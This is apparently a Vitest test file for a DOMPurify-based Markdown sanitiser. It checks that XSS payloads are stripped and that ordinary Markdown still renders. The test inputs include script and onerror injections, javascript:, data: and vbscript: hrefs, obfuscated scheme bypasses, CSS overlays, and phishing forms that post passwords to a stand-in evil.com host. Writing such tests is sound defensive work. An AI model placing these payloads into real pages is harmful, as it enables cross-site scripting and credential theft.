// Tests for the sanitized Markdown pipeline.
//
// Vitest project: jsdom — DOMPurify requires a DOM that correctly processes href attributes in block context (jsdom
// passes DOMPurify's isSupported check and faithfully sanitizes block-context anchors; happy-dom has a known fidelity
// bug where uponSanitizeAttribute may not fire for such elements).
//
// Verifies that the pipeline:
//   1. Renders valid Markdown to HTML.
//   2. Strips script injection payloads (XSS prevention — AC #3).
//   3. Strips HTML injection payloads.
//   4. Never exposes inline event handlers.
//   5. Never exposes javascript:/data:/vbscript: hrefs (including block-context anchors).
//   6. Strips form/input/button phishing elements (Finding 1 — ALLOWED_TAGS allowlist).
//   7. Strips inline style attributes — CSS overlay / clickjacking (Finding 2).
//   8. Rejects obfuscated URI scheme bypasses (Finding 3 — belt-and-suspenders).

import { describe, expect, it } from "vitest";

import { renderSafeMarkdown } from "./sanitize.js";

describe("renderSafeMarkdown()", () => {
  it("renders basic Markdown to HTML", () => {
    const result = renderSafeMarkdown("**bold** and _italic_");
    expect(result).toContain("<strong>bold</strong>");
    expect(result).toContain("<em>italic</em>");
  });

  it("renders a code block", () => {
    const result = renderSafeMarkdown("```\nconst x = 1;\n```");
    expect(result).toContain("<code>");
  });

  it("strips <script> injection payloads (AC #3 — XSS prevention)", () => {
    const malicious = '<script>alert("xss")</script>\n\nSafe text';
    const result = renderSafeMarkdown(malicious);
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert(");
  });

  it("strips inline event handler injection (AC #3)", () => {
    const malicious = '<img src="x" onerror="alert(1)">';
    const result = renderSafeMarkdown(malicious);
    expect(result).not.toContain("onerror");
    expect(result).not.toContain("alert(1)");
  });

  it("strips javascript: href injection via Markdown link (AC #3)", () => {
    const malicious = "[click me](javascript:alert(1))";
    const result = renderSafeMarkdown(malicious);
    expect(result).not.toContain("javascript:");
  });

  it("strips javascript: href injection via block-context raw anchor (AC #3)", () => {
    // A raw <a> tag in a block paragraph — this is the case happy-dom mishandles. jsdom + DOMPurify's
    // ALLOWED_URI_REGEXP allowlist neutralizes it correctly.
    const malicious = '<p><a href="javascript:alert(1)">click</a></p>';
    const result = renderSafeMarkdown(malicious);
    expect(result).not.toContain("javascript:");
  });

  it("strips data: URI injection (AC #3)", () => {
    const malicious = '<a href="data:text/html,<script>alert(1)</script>">click</a>';
    const result = renderSafeMarkdown(malicious);
    expect(result).not.toContain("data:");
  });

  it("strips vbscript: URI injection (AC #3)", () => {
    const malicious = '<a href="vbscript:MsgBox(1)">click</a>';
    const result = renderSafeMarkdown(malicious);
    expect(result).not.toContain("vbscript:");
  });

  it("strips vbscript: URI injection via Markdown link (AC #3)", () => {
    const malicious = "[click me](vbscript:MsgBox(1))";
    const result = renderSafeMarkdown(malicious);
    expect(result).not.toContain("vbscript:");
  });

  it("preserves safe https links", () => {
    const result = renderSafeMarkdown("[Qovira](https://qovira.ai)");
    expect(result).toContain('href="https://qovira.ai"');
    expect(result).toContain("Qovira");
  });

  it("preserves safe http links", () => {
    const result = renderSafeMarkdown("[example](http://example.com)");
    expect(result).toContain('href="http://example.com"');
  });

  it("preserves mailto: links", () => {
    const result = renderSafeMarkdown("[email](mailto:hello@example.com)");
    expect(result).toContain('href="mailto:hello@example.com"');
  });

  it("preserves relative links", () => {
    const result = renderSafeMarkdown("[home](/home)");
    expect(result).toContain('href="/home"');
  });

  it("preserves anchor links", () => {
    const result = renderSafeMarkdown("[section](#section)");
    expect(result).toContain('href="#section"');
  });

  it("returns a non-empty string for empty input", () => {
    const result = renderSafeMarkdown("");
    // Either empty string or empty paragraph — both are safe.
    expect(typeof result).toBe("string");
  });

  it("handles plain text with no Markdown", () => {
    const result = renderSafeMarkdown("Hello, world!");
    expect(result).toContain("Hello, world!");
  });

  it("renders ordered and unordered lists", () => {
    const result = renderSafeMarkdown("- item one\n- item two");
    expect(result).toContain("<li>");
    expect(result).toContain("item one");
  });

  // ---------------------------------------------------------------------------
  // Finding 1 — credential-phishing via form/input/button (ALLOWED_TAGS allowlist)
  // ---------------------------------------------------------------------------

  describe("credential-phishing via form elements (Finding 1)", () => {
    it("strips <form> elements from raw HTML injection", () => {
      // Without an ALLOWED_TAGS allowlist, form survives and can POST credentials cross-origin.
      const payload =
        '<form action="https://evil.com/steal" method="post"><input type="password" name="pwd"><button>Confirm</button></form>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("<form");
    });

    it("strips <input> elements from raw HTML injection", () => {
      const payload = '<form action="https://evil.com/steal"><input type="password" name="pwd"></form>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("<input");
    });

    it("strips <button> elements from raw HTML injection", () => {
      const payload = "<button onclick=\"fetch('https://evil.com')\">Click me</button>";
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("<button");
    });

    it("strips <textarea> elements", () => {
      const payload = "<textarea>steal my content</textarea>";
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("<textarea");
    });

    it("strips <select> elements", () => {
      const payload = '<select><option value="evil">option</option></select>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("<select");
    });
  });

  // ---------------------------------------------------------------------------
  // Finding 2 — CSS overlay / clickjacking via inline style attribute
  // ---------------------------------------------------------------------------

  describe("CSS overlay / clickjacking via style attribute (Finding 2)", () => {
    it("strips style attribute from <p> elements", () => {
      // CSP has 'unsafe-inline' for style-src so DOMPurify is the only defense here.
      const payload = '<p style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:red">overlay</p>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("style=");
    });

    it("strips style attribute used to hide phishing content", () => {
      const payload = '<div style="display:none"><form action="https://evil.com"><input name="x"></form></div>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("style=");
    });

    it("strips style attribute from arbitrary inline elements", () => {
      const payload = '**bold** <span style="color:red;font-size:200%">styled</span>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("style=");
    });
  });

  // ---------------------------------------------------------------------------
  // Finding 3 — obfuscated URI scheme bypasses (belt-and-suspenders)
  // ---------------------------------------------------------------------------

  describe("obfuscated URI scheme bypasses (Finding 3)", () => {
    // Anchor-tightening regression guard — relative and fragment links that the new anchored ALLOWED_URI_REGEXP must
    // continue to pass through unchanged. These tests were added BEFORE the regexp was tightened so any over-tightening
    // is caught immediately (they must pass with both the old and new regexp).

    it("preserves absolute-relative path href (/path)", () => {
      const result = renderSafeMarkdown("[home](/home)");
      expect(result).toContain('href="/home"');
    });

    it("preserves dot-relative path href (./path)", () => {
      const result = renderSafeMarkdown("[relative](./docs/page)");
      expect(result).toContain('href="./docs/page"');
    });

    it("preserves parent-relative path href (../path)", () => {
      const result = renderSafeMarkdown("[up](../other/page)");
      expect(result).toContain('href="../other/page"');
    });

    it("preserves anchor fragment href (#section)", () => {
      const result = renderSafeMarkdown("[section](#my-section)");
      expect(result).toContain('href="#my-section"');
    });

    // Obfuscated scheme rejection — the anchored regexp must reject these at the regexp level, not only because
    // DOMPurify pre-normalises them.

    it("rejects tab-obfuscated javascript: in href", () => {
      // java\tscript: — whitespace inside the scheme name
      const payload = '<a href="java\tscript:alert(1)">click</a>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("javascript:");
      // The href must not appear or must be stripped entirely
      expect(result).not.toMatch(/href=["']java/i);
    });

    it("rejects newline-obfuscated javascript: in href", () => {
      // java\nscript: — newline inside scheme
      const payload = '<a href="java\nscript:alert(1)">click</a>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("javascript:");
      expect(result).not.toMatch(/href=["']java/i);
    });

    it("rejects leading-space obfuscated javascript: in href", () => {
      // ' javascript:' — leading space before scheme
      const payload = '<a href=" javascript:alert(1)">click</a>';
      const result = renderSafeMarkdown(payload);
      expect(result).not.toContain("javascript:");
    });
  });

  // ---------------------------------------------------------------------------
  // Legitimate markdown — allowlist must not be too tight
  // ---------------------------------------------------------------------------

  describe("legitimate markdown still renders correctly", () => {
    it("renders all heading levels h1–h6", () => {
      const md = "# H1\n## H2\n### H3\n#### H4\n##### H5\n###### H6";
      const result = renderSafeMarkdown(md);
      expect(result).toContain("<h1>");
      expect(result).toContain("<h2>");
      expect(result).toContain("<h3>");
      expect(result).toContain("<h4>");
      expect(result).toContain("<h5>");
      expect(result).toContain("<h6>");
    });

    it("renders unordered and ordered lists", () => {
      const md = "- item A\n- item B\n\n1. first\n2. second";
      const result = renderSafeMarkdown(md);
      expect(result).toContain("<ul>");
      expect(result).toContain("<ol>");
      expect(result).toContain("<li>");
    });

    it("renders inline code and fenced code block", () => {
      const md = "Use `const x = 1;` or:\n\n```js\nconst y = 2;\n```";
      const result = renderSafeMarkdown(md);
      expect(result).toContain("<code>");
      expect(result).toContain("<pre>");
    });

    it("renders blockquote", () => {
      const result = renderSafeMarkdown("> This is a quote");
      expect(result).toContain("<blockquote>");
    });

    it("renders https link preserving href", () => {
      const result = renderSafeMarkdown("[Qovira](https://qovira.ai)");
      expect(result).toContain('href="https://qovira.ai"');
    });

    it("renders mailto link preserving href", () => {
      const result = renderSafeMarkdown("[email](mailto:hello@example.com)");
      expect(result).toContain('href="mailto:hello@example.com"');
    });

    it("renders tel link preserving href", () => {
      const result = renderSafeMarkdown("[call](tel:+15551234567)");
      expect(result).toContain('href="tel:+15551234567"');
    });

    it("renders image preserving src and alt", () => {
      const result = renderSafeMarkdown("![alt text](https://example.com/img.png)");
      expect(result).toContain('src="https://example.com/img.png"');
      expect(result).toContain('alt="alt text"');
    });

    it("renders image with title attribute", () => {
      const result = renderSafeMarkdown('![alt](https://example.com/img.png "My title")');
      expect(result).toContain('title="My title"');
    });

    it("renders link with title attribute", () => {
      const result = renderSafeMarkdown('[text](https://example.com "My title")');
      expect(result).toContain('title="My title"');
    });

    it("renders table with thead/tbody/th/td", () => {
      const md = "| A | B |\n|---|---|\n| 1 | 2 |";
      const result = renderSafeMarkdown(md);
      expect(result).toContain("<table>");
      expect(result).toContain("<thead>");
      expect(result).toContain("<tbody>");
      expect(result).toContain("<th>");
      expect(result).toContain("<td>");
    });

    it("renders strong, em, and del (strikethrough)", () => {
      const result = renderSafeMarkdown("**bold** _italic_ ~~strikethrough~~");
      expect(result).toContain("<strong>");
      expect(result).toContain("<em>");
      expect(result).toContain("<del>");
    });

    it("renders horizontal rule", () => {
      const result = renderSafeMarkdown("---");
      expect(result).toContain("<hr");
    });

    it("renders line breaks", () => {
      const result = renderSafeMarkdown("line1  \nline2");
      expect(result).toContain("<br");
    });
  });
});
